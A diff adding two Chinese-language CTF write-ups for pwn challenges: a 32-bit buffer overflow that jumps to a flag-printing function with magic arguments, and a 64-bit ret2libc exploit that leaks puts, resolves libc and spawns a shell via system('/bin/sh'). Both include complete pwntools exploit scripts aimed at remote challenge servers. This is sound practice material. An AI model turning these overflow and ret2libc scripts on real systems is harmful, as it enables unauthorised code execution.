@@ -522,8 +522,136 @@ $ cat flag
 flag{18b6ca26-1d7d-407b-8b08-63dd66d4e775}
 ```
 
+## 0x9.get_started_3dsctf_2016
 
+```
+gwt@ubuntu:~/Desktop$ checksec  get_started_3dsctf_2016 
+[*] '/home/gwt/Desktop/get_started_3dsctf_2016'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+gwt@ubuntu:~/Desktop$ file get_started_3dsctf_2016 
+get_started_3dsctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped
+```
 
+main中：
 
+```
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4[56]; // [esp+4h] [ebp-38h] BYREF
 
+  printf("Qual a palavrinha magica? ", v4[0]);
+  gets(v4);
+  return 0;
+}
+```
+
+还有个get_flag：
+
+```
+void __cdecl get_flag(int a1, int a2)
+{
+  int v2; // esi
+  unsigned __int8 v3; // al
+  int v4; // ecx
+  unsigned __int8 v5; // al
+
+  if ( a1 == 814536271 && a2 == 425138641 )
+  {
+    v2 = fopen("flag.txt", "rt");
+    v3 = getc(v2);
+    if ( v3 != 255 )
+    {
+      v4 = v3;
+      do
+      {
+        putchar(v4);
+        v5 = getc(v2);
+        v4 = v5;
+      }
+      while ( v5 != 255 );
+    }
+    fclose(v2);
+  }
+}
+```
+
+### 方法一：
+
+```Python
+from pwn import *
+q = remote('node3.buuoj.cn',29154)
+#q = process('./get_started_3dsctf_2016')
+context.log_level = 'debug'
+#sleep(0.1)
+get_addr = 0x080489A0
+exit_addr = 0x0804E6A0
+a1 = 814536271
+a2 = 425138641
+payload = 'a'*(56)
+payload += p32(get_addr) + p32(exit_addr)
+payload += p32(a1) + p32(a2)
+q.sendline(payload)
+sleep(0.1)
+q.recv()
+```
+
+### 方法二：（未完成）
+
+mprotect函数，可以修改内存段的权限
+
+```
+int mprotect(void *addr, size_t len, int prot);
+addr 内存启始地址
+len  修改内存的长度
+prot 内存的权限
+```
+
+## 0xA.ciscn_2019_en_2
+
+ret2libc.
+
+```python
+from pwn import *
+from LibcSearcher import *
+context(log_level='DEBUG')
+#io = process("./ciscn_2019_en_2")
+io = remote('node3.buuoj.cn',29045)
+elf = ELF("./ciscn_2019_en_2")
+ret = 0x04006b9
+pop_rdi_ret = 0x0400c83
+main = 0x400B28
+
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+
+payload = 0x58 * 'a'+ p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+ p64(main)
+
+io.recvuntil("choice!")
+io.sendline("1")
+io.recvuntil("encrypted")
+io.sendline(payload)
+io.recvuntil("Ciphertext")
+io.recvline()
+io.recvline()
+puts_addr =u64(io.recvuntil("\n")[:-1].ljust(8,'\0'))
+
+libc = LibcSearcher("puts",puts_addr)
+base = puts_addr - libc.dump('puts')
+system_addr = base + libc.dump("system")
+bin_sh = base + libc.dump('str_bin_sh')
+
+payload = 0x58*'a'+p64(ret)+p64(pop_rdi_ret) +p64(bin_sh)+ p64(system_addr)
+#Ubuntu18调用system时要ret，不然会crash
+#栈对齐
+io.sendline('1')
+io.recvuntil("encrypted")
+io.sendline(payload)
+io.interactive()
+
+#gdb.attach(io)
+```
 
